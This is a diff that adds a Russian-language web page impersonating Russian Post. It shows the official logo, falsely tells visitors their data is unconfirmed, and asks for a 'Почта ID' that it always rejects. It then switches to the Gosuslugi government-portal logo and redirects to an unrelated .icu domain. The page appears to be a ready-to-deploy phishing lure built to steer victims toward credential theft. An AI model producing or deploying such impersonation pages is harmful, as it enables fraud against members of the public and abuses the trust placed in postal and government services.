@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Уведомление Почты России</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
+
+    body, html {
+      margin: 0; padding: 0;
+      height: 100%;
+      font-family: 'Inter', sans-serif;
+      background-color: #F6F7F9;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+    }
+
+    .center-wrapper {
+      width: 320px;
+      max-width: 90vw;
+      text-align: center;
+      position: relative;
+      min-height: 260px;
+    }
+
+    .logo {
+      width: 150px;
+      margin: 0 auto 30px auto;
+      display: block;
+      filter: drop-shadow(0 0 0 rgba(25, 40, 220, 0));
+      animation: none;
+    }
+
+    /* Пульсация */
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); filter: drop-shadow(0 0 0 rgba(25, 40, 220, 0)); }
+      50% { transform: scale(1.1); filter: drop-shadow(0 0 8px rgba(25, 40, 220, 0.8)); }
+    }
+
+    /* Общие плавные появления */
+    .fade-in {
+      opacity: 0;
+      transform: translateY(15px);
+      transition: opacity 0.8s ease, transform 0.8s ease;
+    }
+    .fade-in.visible {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    /* Сообщения */
+    .message-box {
+      border: 3px solid #1928DC;
+      padding: 15px 20px;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 600;
+      line-height: 1.4;
+      color: #1928DC;
+      background-color: transparent;
+      margin-bottom: 20px;
+      box-sizing: border-box;
+      animation: borderPulse 2s infinite alternate;
+      user-select: none;
+    }
+
+    @keyframes borderPulse {
+      0% {
+        border-color: #1928DC;
+        box-shadow: 0 0 5px #1928DC;
+      }
+      100% {
+        border-color: #1928DC;
+        box-shadow: 0 0 15px #1928DC;
+      }
+    }
+
+    /* Кнопки */
+    button {
+      background-color: white;
+      color: #1928DC;
+      border: none;
+      border-radius: 6px;
+      font-size: 18px;
+      font-weight: 600;
+      padding: 12px 25px;
+      cursor: pointer;
+      transition: background-color 0.3s ease, color 0.3s ease;
+      width: 100%;
+      max-width: 320px;
+      box-sizing: border-box;
+      user-select: none;
+    }
+    button:hover:not(:disabled) {
+      background-color: #0f1ab0;
+      color: white;
+    }
+    button:disabled {
+      cursor: not-allowed;
+      opacity: 0.6;
+    }
+
+    /* Инпут */
+    input[type="text"] {
+      padding: 12px 15px;
+      font-size: 18px;
+      border: 1.8px solid #ccc;
+      border-radius: 6px;
+      width: 100%;
+      max-width: 320px;
+      font-weight: 400;
+      letter-spacing: 2px;
+      outline-offset: 2px;
+      outline-color: transparent;
+      transition: outline-color 0.3s, border-color 0.3s;
+      text-align: center;
+      box-sizing: border-box;
+      margin-bottom: 20px;
+      user-select: text;
+    }
+    input[type="text"]::placeholder {
+      color: #999999;
+    }
+    input[type="text"]:focus {
+      outline-color: #1928DC;
+      border-color: #1928DC;
+    }
+
+    @media (max-width: 400px) {
+      .center-wrapper {
+        width: 90vw;
+      }
+      input[type="text"], button {
+        max-width: 100%;
+        font-size: 16px;
+        padding: 10px 12px;
+      }
+      .logo {
+        width: 120px;
+        margin-bottom: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="center-wrapper">
+
+    <!-- Логотип -->
+    <img id="logo" class="logo" src="https://www.pochta.ru/assets/Logo_Kirillicza_Dvuhstrochnyj_256d5530b1.jpg" alt="Логотип Почты России" />
+
+    <!-- Первый экран: сообщение + кнопка -->
+    <div id="firstScreen" class="fade-in">
+      <div class="message-box">
+        Уважаемый пользователь, указанный номер не имеет подтверждённых данных.<br />
+        Подтвердить данные Вы можете через Почта ID
+      </div>
+      <button id="firstContinueBtn">Продолжить</button>
+    </div>
+
+    <!-- Второй экран: ввод Почта ID + кнопка -->
+    <div id="secondScreen" class="fade-in" style="display:none;">
+      <input
+        id="pochtaIdInput"
+        type="text"
+        placeholder="Введите Почта ID (формат XXXX-XXXX-XXXX)"
+        maxlength="14"
+        autocomplete="off"
+        inputmode="numeric"
+        pattern="[0-9\-]*"
+      />
+      <button id="secondContinueBtn" disabled>Продолжить</button>
+    </div>
+
+    <!-- Третий экран: сообщение + кнопка "Другой способ" -->
+    <div id="thirdScreen" class="fade-in" style="display:none;">
+      <div class="message-box">
+        Данные не найдены, выберите другой способ актуализации.
+      </div>
+      <button id="otherMethodBtn">Другой способ</button>
+    </div>
+
+  </div>
+
+<script>
+  const logo = document.getElementById('logo');
+
+  const firstScreen = document.getElementById('firstScreen');
+  const firstContinueBtn = document.getElementById('firstContinueBtn');
+
+  const secondScreen = document.getElementById('secondScreen');
+  const pochtaIdInput = document.getElementById('pochtaIdInput');
+  const secondContinueBtn = document.getElementById('secondContinueBtn');
+
+  const thirdScreen = document.getElementById('thirdScreen');
+  const otherMethodBtn = document.getElementById('otherMethodBtn');
+
+  // Функция для пульсации логотипа с длительностью (мс)
+  function pulseLogo(duration, src = null) {
+    return new Promise(resolve => {
+      if(src) logo.src = src;
+      logo.style.animation = 'pulse 1.2s infinite';
+
+      setTimeout(() => {
+        logo.style.animation = 'none';
+        resolve();
+      }, duration);
+    });
+  }
+
+  // Функция плавного показа элемента
+  function showElement(el) {
+    el.style.display = 'block';
+    requestAnimationFrame(() => {
+      el.classList.add('visible');
+    });
+  }
+
+  // Функция плавного скрытия элемента
+  function hideElement(el) {
+    return new Promise(resolve => {
+      el.classList.remove('visible');
+      setTimeout(() => {
+        el.style.display = 'none';
+        resolve();
+      }, 800);
+    });
+  }
+
+  // Форматирование Почта ID: ввод только цифр и ставим тире после каждого 4 символа, максимум 14 (в формате XXXX-XXXX-XXXX)
+  pochtaIdInput.addEventListener('input', () => {
+    let val = pochtaIdInput.value;
+    // Удаляем все кроме цифр
+    val = val.replace(/[^\d]/g, '');
+    if(val.length > 12) val = val.slice(0, 12); // максимум 12 цифр (3 группы по 4)
+
+    // Формируем с тире
+    let formatted = '';
+    for(let i=0; i<val.length; i++) {
+      if(i > 0 && i % 4 === 0) formatted += '-';
+      formatted += val[i];
+    }
+    pochtaIdInput.value = formatted;
+
+    // Включаем кнопку если длина 14 символов (12 цифр + 2 тире)
+    if(formatted.length === 14) {
+      secondContinueBtn.disabled = false;
+    } else {
+      secondContinueBtn.disabled = true;
+    }
+  });
+
+  // Сценарий показа при загрузке
+  window.addEventListener('load', async () => {
+    await pulseLogo(3500);   // пульсация логотипа 3.5 секунды
+    showElement(firstScreen);
+  });
+
+  // Нажатие первой кнопки "Продолжить"
+  firstContinueBtn.addEventListener('click', async () => {
+    await hideElement(firstScreen);
+    showElement(secondScreen);
+    pochtaIdInput.focus();
+  });
+
+  // Нажатие второй кнопки "Продолжить"
+  secondContinueBtn.addEventListener('click', async () => {
+    await hideElement(secondScreen);
+    // Пульсация логотипа Почты России (3.5 сек)
+    await pulseLogo(3500, 'https://www.pochta.ru/assets/Logo_Kirillicza_Dvuhstrochnyj_256d5530b1.jpg');
+
+    showElement(thirdScreen);
+  });
+
+  // Нажатие кнопки "Другой способ"
+  otherMethodBtn.addEventListener('click', async () => {
+    // Скрываем третий экран
+    await hideElement(thirdScreen);
+
+    // Меняем логотип на Госуслуг и пульсация 4 секунды
+    await pulseLogo(4000, 'https://static.wikia.nocookie.net/sitepedia/images/8/82/%D0%93%D0%BE%D1%81%D1%83%D1%81%D0%BB%D1%83%D0%B3%D0%B8_%28%D0%BB%D0%BE%D0%B3%D0%BE%D1%82%D0%B8%D0%BF%29.png/revision/latest?cb=20240521142719&path-prefix=ru');
+
+    // После пульсации переадресация
+    window.location.href = 'https://sort-center64742.icu/';
+  });
+
+</script>
+</body>
+</html>
